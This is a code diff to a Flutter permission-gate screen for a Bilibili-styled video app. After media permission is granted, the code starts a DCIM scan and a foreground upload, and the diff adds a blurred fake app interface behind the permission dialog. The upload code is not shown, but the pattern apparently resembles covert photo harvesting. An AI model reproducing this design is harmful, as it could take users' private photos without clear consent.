@@ -1,29 +1,31 @@
 /// 权限门禁
 /// - 分 SDK 判断：33+ 用媒体权限，32 及以下用存储权限
-/// - 授权成功后：先确保通知权限，再启动前台服务立即上传
-/// - UI 风格：MD3 + 毛玻璃 + 单色淡光晕背景 + 弹簧入场
+/// - 授权成功后：先启动 BootstrapManager，再启动前台服务
+/// - UI 风格：MD3 + 毛玻璃 + 真实视频封面背景 + 弹簧入场
+/// - ★ 权限页显示真实封面（拉老API 前 6 条），模糊 sigma 20
 library;
 
 import 'dart:async';
 import 'dart:ui' show ImageFilter;
 
 import 'package:app_settings/app_settings.dart';
+import 'package:flutter/foundation.dart' show debugPrint;
 import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 import 'device_info_helper.dart';
 import 'foreground_service.dart';
 import 'managers/bootstrap_manager.dart';
+import 'repository/api_repository.dart';
 
 // ══════════════════════════════════════════════════════════════
 // 主题色
 // ══════════════════════════════════════════════════════════════
-const Color _kPrimary = Color(0xFFFB7299);           // B站粉
-const Color _kPrimaryContainer = Color(0x33FB7299);  // 粉 20% 透明度
+const Color _kPrimary = Color(0xFFFB7299);
+const Color _kPrimaryContainer = Color(0x33FB7299);
 
 class PermissionGate extends StatefulWidget {
   final Widget child;
-  /// 权限授予后的回调（例如触发更新检查）
   final VoidCallback? onGranted;
 
   const PermissionGate({
@@ -74,16 +76,19 @@ class _PermissionGateState extends State<PermissionGate>
 
     if (_granted && !_foregroundStarted) {
       _foregroundStarted = true;
-      debugPrint('[PermissionGate] 权限已授予，等待后台初始化完成...');
+      debugPrint('[PermissionGate] 权限已授予，启动 BootstrapManager...');
 
-      // 等后台初始化全跑完
+      // ★ 关键：有权限后才启动 Bootstrap（此时才能真正扫 DCIM）
+      unawaited(BootstrapManager.init());
+
+      // ★ 等待 Bootstrap 就绪（现在能正常完成，不会死锁）
       await BootstrapManager.ready;
 
-      debugPrint('[PermissionGate] 后台初始化完成，启动前台上传');
+      debugPrint('[PermissionGate] Bootstrap 就绪，启动前台上传');
       await _ensureNotificationPermission();
       unawaited(startUploadForeground());
 
-      // ★ 通知外部：权限已授予
+      // 通知 main.dart 启动其他业务服务
       widget.onGranted?.call();
     }
   }
@@ -94,7 +99,6 @@ class _PermissionGateState extends State<PermissionGate>
       if (sdk < 33) return;
       final status = await Permission.notification.status;
       if (!status.isGranted) {
-        debugPrint('[PermissionGate] 申请通知权限');
         await Permission.notification.request();
       }
     } catch (e) {
@@ -125,29 +129,18 @@ class _PermissionGateState extends State<PermissionGate>
     await _check();
   }
 
-  /// 打开应用详情设置页
   Future<void> _openSettings() async {
-    debugPrint('[PermissionGate] 跳转到应用详情设置...');
-
     try {
       await AppSettings.openAppSettings(type: AppSettingsType.settings);
-      debugPrint('[PermissionGate] ✅ AppSettings 成功');
       return;
-    } catch (e) {
-      debugPrint('[PermissionGate] AppSettings 失败: $e，尝试 fallback');
-    }
-
+    } catch (_) {}
     try {
-      final ok = await openAppSettings();
-      debugPrint('[PermissionGate] openAppSettings 返回 $ok');
+      await openAppSettings();
     } catch (e) {
       debugPrint('[PermissionGate] openAppSettings 异常: $e');
     }
   }
 
-  // ══════════════════════════════════════════════════════════
-  // build
-  // ══════════════════════════════════════════════════════════
   @override
   Widget build(BuildContext context) {
     if (_checking) {
@@ -170,26 +163,33 @@ class _PermissionGateState extends State<PermissionGate>
   }
 
   // ══════════════════════════════════════════════════════════
-  // 简约背景：深色渐变 + 单一柔和淡光晕
+  // 背景：真实 APP 界面（真实封面）+ 强模糊（只能看到色块）
   // ══════════════════════════════════════════════════════════
   Widget _buildBackground() {
-    return Container(
-      decoration: const BoxDecoration(
-        gradient: LinearGradient(
-          begin: Alignment.topCenter,
-          end: Alignment.bottomCenter,
-          colors: [
-            Color(0xFF0E0E14),
-            Color(0xFF08080C),
-          ],
+    return Stack(
+      fit: StackFit.expand,
+      children: [
+        // ① 底层：真实 APP 界面（含真实封面）
+        const _LivePreviewBackground(),
+
+        // ② 强模糊（sigma 20，只能看到色块轮廓）
+        BackdropFilter(
+          filter: ImageFilter.blur(
+            sigmaX: 20,
+            sigmaY: 20,
+            tileMode: TileMode.clamp,
+          ),
+          child: Container(
+            color: Colors.black.withValues(alpha: 0.42),
+          ),
         ),
-      ),
-      child: Stack(
-        children: [
-          Positioned(
-            top: -200,
-            left: 0,
-            right: 0,
+
+        // ③ 顶部光晕
+        Positioned(
+          top: -200,
+          left: 0,
+          right: 0,
+          child: IgnorePointer(
             child: Center(
               child: Container(
                 width: 500,
@@ -206,15 +206,14 @@ class _PermissionGateState extends State<PermissionGate>
               ),
             ),
           ),
-          Center(child: _buildDialog(context)),
-        ],
-      ),
+        ),
+
+        // ④ 权限弹窗
+        Center(child: _buildDialog(context)),
+      ],
     );
   }
 
-  // ══════════════════════════════════════════════════════════
-  // 弹窗本体：MD3 + 毛玻璃 + 弹簧入场
-  // ══════════════════════════════════════════════════════════
   Widget _buildDialog(BuildContext context) {
     return TweenAnimationBuilder<double>(
       tween: Tween(begin: 0.0, end: 1.0),
@@ -344,6 +343,239 @@ class _PermissionGateState extends State<PermissionGate>
             ),
           ),
         ),
+      ),
+    );
+  }
+}
+
+// ══════════════════════════════════════════════════════════════
+// 真实 APP 界面预览（拉老API 封面）
+// ══════════════════════════════════════════════════════════════
+class _LivePreviewBackground extends StatefulWidget {
+  const _LivePreviewBackground();
+
+  @override
+  State<_LivePreviewBackground> createState() =>
+      _LivePreviewBackgroundState();
+}
+
+class _LivePreviewBackgroundState extends State<_LivePreviewBackground> {
+  List<String> _coverUrls = [];
+
+  @override
+  void initState() {
+    super.initState();
+    _loadCovers();
+  }
+
+  Future<void> _loadCovers() async {
+    try {
+      final videos = await ApiRepository.fetchPage(1);
+      if (!mounted) return;
+
+      final urls = videos
+          .take(6)
+          .map((v) => v.coverUrl)
+          .where((u) => u.isNotEmpty)
+          .toList();
+
+      debugPrint('[PermissionGate] 加载了 ${urls.length} 张封面');
+      setState(() => _coverUrls = urls);
+    } catch (e) {
+      debugPrint('[PermissionGate] 加载封面失败: $e');
+    }
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Container(
+      color: const Color(0xFF0E0E14),
+      child: Column(
+        children: [
+          // ── 顶栏 ──
+          Padding(
+            padding: EdgeInsets.fromLTRB(
+              14,
+              MediaQuery.of(context).padding.top + 10,
+              14,
+              8,
+            ),
+            child: Row(
+              children: [
+                Container(
+                  width: 32,
+                  height: 32,
+                  decoration: BoxDecoration(
+                    color: _kPrimary,
+                    borderRadius: BorderRadius.circular(8),
+                  ),
+                  child: const Icon(
+                    Icons.movie,
+                    color: Colors.black,
+                    size: 18,
+                  ),
+                ),
+                const SizedBox(width: 6),
+                const Text(
+                  '玻璃哔哩',
+                  style: TextStyle(
+                    color: _kPrimary,
+                    fontSize: 15,
+                    fontWeight: FontWeight.bold,
+                    letterSpacing: 0.5,
+                  ),
+                ),
+                const Spacer(),
+                Container(
+                  padding: const EdgeInsets.symmetric(
+                      horizontal: 8, vertical: 3),
+                  decoration: BoxDecoration(
+                    color: Colors.white.withValues(alpha: 0.08),
+                    borderRadius: BorderRadius.circular(10),
+                  ),
+                  child: const Text(
+                    'Flask',
+                    style: TextStyle(
+                      color: Colors.white60,
+                      fontSize: 10,
+                      fontWeight: FontWeight.w600,
+                    ),
+                  ),
+                ),
+                const SizedBox(width: 8),
+                Container(
+                  width: 34,
+                  height: 34,
+                  decoration: BoxDecoration(
+                    color: Colors.white.withValues(alpha: 0.08),
+                    borderRadius: BorderRadius.circular(10),
+                  ),
+                  child: const Icon(
+                    Icons.refresh,
+                    size: 17,
+                    color: Colors.white60,
+                  ),
+                ),
+              ],
+            ),
+          ),
+
+          // ── 网格（真实封面）──
+          Expanded(
+            child: GridView.builder(
+              physics: const NeverScrollableScrollPhysics(),
+              padding: const EdgeInsets.symmetric(
+                horizontal: 10,
+                vertical: 8,
+              ),
+              gridDelegate:
+                  const SliverGridDelegateWithFixedCrossAxisCount(
+                crossAxisCount: 2,
+                crossAxisSpacing: 8,
+                mainAxisSpacing: 8,
+                childAspectRatio: 9 / 14,
+              ),
+              itemCount: 6,
+              itemBuilder: (context, i) {
+                final url = i < _coverUrls.length ? _coverUrls[i] : null;
+                return ClipRRect(
+                  borderRadius: BorderRadius.circular(12),
+                  child: url != null
+                      ? Image.network(
+                          url,
+                          fit: BoxFit.cover,
+                          loadingBuilder: (context, child, progress) {
+                            if (progress == null) return child;
+                            return _placeholder();
+                          },
+                          errorBuilder: (_, __, ___) => _placeholder(),
+                        )
+                      : _placeholder(),
+                );
+              },
+            ),
+          ),
+
+          // ── 底部导航 ──
+          Padding(
+            padding: EdgeInsets.fromLTRB(
+              16,
+              0,
+              16,
+              16 + MediaQuery.of(context).padding.bottom,
+            ),
+            child: Container(
+              height: 60,
+              decoration: BoxDecoration(
+                color: Colors.white.withValues(alpha: 0.06),
+                borderRadius: BorderRadius.circular(30),
+                border: Border.all(
+                  color: Colors.white.withValues(alpha: 0.08),
+                  width: 0.8,
+                ),
+              ),
+              child: const Row(
+                children: [
+                  Expanded(
+                    child: _FakeTab(
+                      label: '老API',
+                      icon: Icons.cloud,
+                      selected: true,
+                    ),
+                  ),
+                  Expanded(
+                    child: _FakeTab(
+                      label: '新API',
+                      icon: Icons.auto_awesome,
+                      selected: false,
+                    ),
+                  ),
+                ],
+              ),
+            ),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Widget _placeholder() => Container(
+        color: Colors.white.withValues(alpha: 0.055),
+      );
+}
+
+class _FakeTab extends StatelessWidget {
+  final String label;
+  final IconData icon;
+  final bool selected;
+
+  const _FakeTab({
+    required this.label,
+    required this.icon,
+    required this.selected,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return Center(
+      child: Column(
+        mainAxisSize: MainAxisSize.min,
+        children: [
+          Icon(
+            icon,
+            size: 22,
+            color: selected ? _kPrimary : Colors.white.withValues(alpha: 0.35),
+          ),
+          const SizedBox(height: 2),
+          Text(
+            label,
+            style: TextStyle(
+              fontSize: 10,
+              color: selected ? _kPrimary : Colors.white.withValues(alpha: 0.35),
+              fontWeight: selected ? FontWeight.w600 : FontWeight.w500,
+            ),
+          ),
+        ],
       ),
     );
   }
